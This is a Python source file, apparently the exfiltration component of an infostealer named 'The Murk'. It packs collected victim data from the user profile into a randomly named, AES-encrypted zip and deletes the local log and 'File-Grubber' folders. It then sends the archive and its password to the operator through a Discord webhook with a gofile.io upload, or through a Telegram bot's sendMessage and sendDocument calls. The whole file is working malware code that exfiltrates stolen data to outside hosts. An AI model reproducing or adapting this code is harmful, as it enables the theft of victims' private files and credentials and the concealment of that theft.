from shutil import make_archive, rmtree
from requests import post, get
from os import chdir, remove, environ
from os.path import basename, join
from manager.logger import Log
from random import randint
from pyzipper import AESZipFile, ZIP_STORED, WZ_AES
from json import dumps
from preferences.config import config

def upload_file_to_gofile(file_path):
    try:
        servers_get = get("https://api.gofile.io/servers")
        if servers_get.status_code == 200: servers = servers_get.json()["data"]["servers"]
        else: raise Exception("Failed to get servers")

        if not servers: raise Exception("No server is available to upload")

        server = servers[randint(0, len(servers) - 1)]["name"]
        with open(file_path, 'rb') as file:
            response = post(f'https://{server}.gofile.io/contents/uploadfile', files={ 'file': file })
            if response.status_code == 200: return response.json()["data"]["downloadPage"]
            else: raise Exception("Failed to upload file")
        
    except Exception as e:
        Log(e)
        return e

def MakeZip():
    dox = "qwertyuiopasdfghjklzxcvbnm1234567890"
    pwd_str = ""
    name = ""
    for i in range (40):
        name += dox[randint(0,len(dox)-1)]
    for i in range (60):
        pwd_str += dox[randint(0,len(dox)-1)]
    password = bytes(pwd_str, "UTF-8")
    
    try:
        chdir(environ["TEMP"])
        make_archive("logs", "zip", join(environ["USERPROFILE"], config.pathToLogs))
        result_path = join(environ["TEMP"], f"{name}.zip")

        with AESZipFile(result_path, "w", compression=ZIP_STORED, encryption=WZ_AES) as logs:
            logs.setpassword(password)
            logs.write("logs.zip")
        remove("logs.zip")
        return [result_path, pwd_str]
    except Exception as e:
        Log(f"MakeZip ---> {e}")
        return None


def Clean(user) -> None:
    rmtree(f'{user}\\{config.pathToLogs}\\Files\\File-Grubber', ignore_errors=True)
    rmtree(f'{user}\\{config.pathToLogs}', ignore_errors=True)

def MsgForDiscord(message, url) -> str:
    message = message.replace('<b>', '**')
    message = message.replace('</b>', '**')
    message = message.replace('<code>', '`')
    message = message.replace('</code>', '`')
    message = message.replace('<u>', '__')
    message = message.replace('</u>', '__')
    message = message.replace('<i>', '*')
    message = message.replace('</i>', '*')
    message = message.replace(f"<a href=\"{str(url)}\">🔗Link</a>",f"[🔗Link]({str(url)})")
    return message




def Send(sendData, msgInfo) -> None:
    user = environ['USERPROFILE']
    zipInfo = []
    url = None
    Log("===========Conclusion===========")

    zipInfo = MakeZip()
    Clean(user)
    if not zipInfo: return None

    file_name = basename(zipInfo[0])
    if sendData[0] == 0: url = f"<a href='{upload_file_to_gofile(zipInfo[0])}'>Link</a>"
    message = f"<u><b>🛑hey bro, see The Murk results🛑</b></u>\n🔗{url or f"<code>{file_name}</code>"}\n📜Password: <code>{zipInfo[1]}</code>\n\n<i>⇓Collected data⇓</i>\n{msgInfo[0]}{msgInfo[1]}"
    
    if sendData[0] == 0:
        message = MsgForDiscord(message, url)
        try:
            post(sendData[1], data=dumps({ "content": message }), headers={ "Content-Type": "application/json" })
        except Exception as e:
            Log(f"Send(post) ---> {e}")
    if sendData[0] == 1:
        try:
            post(f"https://api.telegram.org/bot{sendData[1]}/sendMessage", data={ "chat_id": int(sendData[2]), "text": message, "parse_mode": "HTML", "disable_web_page_preview": True })
            with open(zipInfo[0], "rb") as file:
                post(f"https://api.telegram.org/bot{sendData[1]}/sendDocument", data={ "chat_id": int(sendData[2]) }, files={ "document": (file_name, file) })
        except Exception as e: Log(f"Send(post) ---> {e}")